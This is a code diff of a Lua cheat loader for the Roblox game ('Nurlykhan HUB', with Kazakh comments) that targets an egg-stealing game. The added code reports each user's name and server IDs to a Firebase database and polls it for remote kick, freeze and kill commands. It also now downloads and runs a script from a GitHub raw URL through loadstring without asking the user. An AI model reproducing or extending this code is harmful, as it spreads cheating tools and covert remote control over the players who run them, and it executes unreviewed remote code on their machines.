@@ -9,16 +9,56 @@ local HttpService = game:GetService("HttpService")
 local DATABASE_URL = "https://play-lag-default-rtdb.firebaseio.com/ActiveUsers"
 local SETTINGS_URL = "https://play-lag-default-rtdb.firebaseio.com/Settings"
 
--- Жаңа негізгі скрипт сілтемесі
 local HUB_URL = "https://raw.githubusercontent.com/h16536666-dotcom/Egg-Roblox-Delta-script-/refs/heads/main/StealAnEgg.lua"
 
--- Бұрын жүктелген болса, бірден қосу (1-ақ рет сұрау үшін)
+-- АДМИН КОМАНДАЛАРЫН ТЕКСЕРІП ТҰРУ ЦИКЛІ (Kick, Freeze, Kill)
+task.spawn(function()
+    while task.wait(1.5) do
+        pcall(function()
+            local res = request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json", Method = "GET" })
+            if res and res.StatusCode == 200 then
+                local uData = HttpService:JSONDecode(res.Body)
+                if type(uData) == "table" then
+                    -- 1. Kick (Шығарып жіберу)
+                    if uData.Kick == true then
+                        LocalPlayer:Kick("Nurlykhan HUB 👑: Админ сізді ойыннан шығарды!")
+                    end
+
+                    -- 2. Freeze (Қатырып тастау)
+                    if uData.Freeze == true then
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                            LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                        end
+                    elseif uData.Freeze == false then
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                            LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                        end
+                    end
+
+                    -- 3. Kill (Өлтіру)
+                    if uData.Kill == true then
+                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                            LocalPlayer.Character.Humanoid.Health = 0
+                        end
+                        -- Команда аяқталған соң өшіру
+                        request({
+                            Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kill.json",
+                            Method = "PUT",
+                            Headers = {["Content-Type"] = "application/json"},
+                            Body = HttpService:JSONEncode(false)
+                        })
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Бұрын жүктелген болса, бірден қосу (1-ақ рет сұрау)
 if getgenv().NurlykhanHubLoaded == true then
     pcall(function() 
         local source = game:HttpGet(HUB_URL)
-        if source and source ~= "" then 
-            loadstring(source)() 
-        end
+        if source and source ~= "" then loadstring(source)() end
     end)
     return
 end
@@ -26,14 +66,11 @@ end
 local currentPassword = "1921"
 local updateData = {Enabled = false, Message = ""}
 
--- Базадан ақпаратты тексеру
 pcall(function()
     local passRes = request({ Url = SETTINGS_URL .. "/Password.json", Method = "GET" })
     if passRes and passRes.StatusCode == 200 then
         local pData = HttpService:JSONDecode(passRes.Body)
-        if pData and type(pData) == "string" and pData ~= "" then 
-            currentPassword = pData 
-        end
+        if pData and type(pData) == "string" and pData ~= "" then currentPassword = pData end
     end
 
     local updateRes = request({ Url = SETTINGS_URL .. "/UpdateData.json", Method = "GET" })
@@ -87,84 +124,21 @@ if updateData.Enabled == true then
 end
 
 local function showUpdateScreen()
-    local CoreGui = game:GetService("CoreGui")
-    local UpdGui = Instance.new("ScreenGui")
-    UpdGui.Name = "NurlykhanUpdateGui"
-    UpdGui.ResetOnSpawn = false
-
-    pcall(function() UpdGui.Parent = CoreGui end)
-    if not UpdGui.Parent then UpdGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
-
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Size = UDim2.new(0, 420, 0, 280)
-    MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Active = true
-    MainFrame.Draggable = true
-    MainFrame.Parent = UpdGui
-    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
-
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1, 0, 0, 40)
-    Title.BackgroundTransparency = 1
-    Title.Text = "🚨 NURLYKHAN HUB - ЖАҢАРТУ 🚨"
-    Title.TextColor3 = Color3.fromRGB(255, 215, 0)
-    Title.TextSize = 16
-    Title.Font = Enum.Font.SourceSansBold
-    Title.Parent = MainFrame
-
-    local Desc = Instance.new("TextLabel")
-    Desc.Size = UDim2.new(0.9, 0, 0, 110)
-    Desc.Position = UDim2.new(0.05, 0, 0.2, 0)
-    Desc.BackgroundTransparency = 1
-    Desc.Text = "Бәріңе сәлем ойыншылар!\nСкрипт жаңартылды, қалай, скрипт жақсы ма?\nБірақ жұмыртқа ұшып ұрлайтын істей қалады, оны түзеді бірақ түзелген жоқ, сондықтан ұшатын істемейді.\nЖаңару уақыты аяқталды, қазір қосыласыз!\nЖаңару ұнаса чатқа 'ұнады' деп жазыңыз!"
-    Desc.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Desc.TextSize = 12
-    Desc.Font = Enum.Font.SourceSans
-    Desc.TextWrapped = true
-    Desc.Parent = MainFrame
-
-    local UpdateBtn = Instance.new("TextButton")
-    UpdateBtn.Size = UDim2.new(0.9, 0, 0, 40)
-    UpdateBtn.Position = UDim2.new(0.05, 0, 0.72, 0)
-    UpdateBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-    UpdateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    UpdateBtn.Text = "🔥 Скриптті қосу"
-    UpdateBtn.TextSize = 14
-    UpdateBtn.Font = Enum.Font.SourceSansBold
-    UpdateBtn.Parent = MainFrame
-    Instance.new("UICorner", UpdateBtn).CornerRadius = UDim.new(0, 8)
-
-    UpdateBtn.MouseButton1Click:Connect(function()
-        UpdGui:Destroy()
-        getgenv().NurlykhanHubLoaded = true
-
-        -- Скриптті бірден қосу (Загрузкасыз)
-        local success, err = pcall(function()
-            local source = game:HttpGet(HUB_URL)
-            if source and source ~= "" then 
-                loadstring(source)() 
-            else
-                error("Скрипт файлы бос болып келді!")
-            end
-        end)
-
-        if success then
-            game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "Nurlykhan HUB 👑",
-                Text = "Скрипт сәтті қосылды!",
-                Duration = 4
-            })
-        else
-            game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "⚠️ ҚАТЕШІЛІК!",
-                Text = "Скрипт ашылмады. Интернетті тексеріңіз!",
-                Duration = 5
-            })
-            warn("Nurlykhan HUB Қателігі: " .. tostring(err))
-        end
+    getgenv().NurlykhanHubLoaded = true
+    
+    -- ЗАГРУЗКАСЫЗ БІРДЕН ҚОСУ
+    local success, err = pcall(function()
+        local source = game:HttpGet(HUB_URL)
+        if source and source ~= "" then loadstring(source)() end
     end)
+
+    if success then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Nurlykhan HUB 👑",
+            Text = "Скрипт сәтті қосылды!",
+            Duration = 4
+        })
+    end
 end
 
 local function registerActiveUser()
@@ -174,7 +148,15 @@ local function registerActiveUser()
                 Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json",
                 Method = "PUT",
                 Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({Username = LocalPlayer.Name, Time = os.time(), Kick = false, Pause = false})
+                Body = HttpService:JSONEncode({
+                    Username = LocalPlayer.Name,
+                    Time = os.time(),
+                    Kick = false,
+                    Freeze = false,
+                    Kill = false,
+                    JobId = game.JobId,
+                    PlaceId = game.PlaceId
+                })
             })
         end)
     end)
@@ -182,7 +164,6 @@ local function registerActiveUser()
     showUpdateScreen()
 end
 
--- Пароль тексеру
 if currentPassword == "NONE" then
     registerActiveUser()
 else
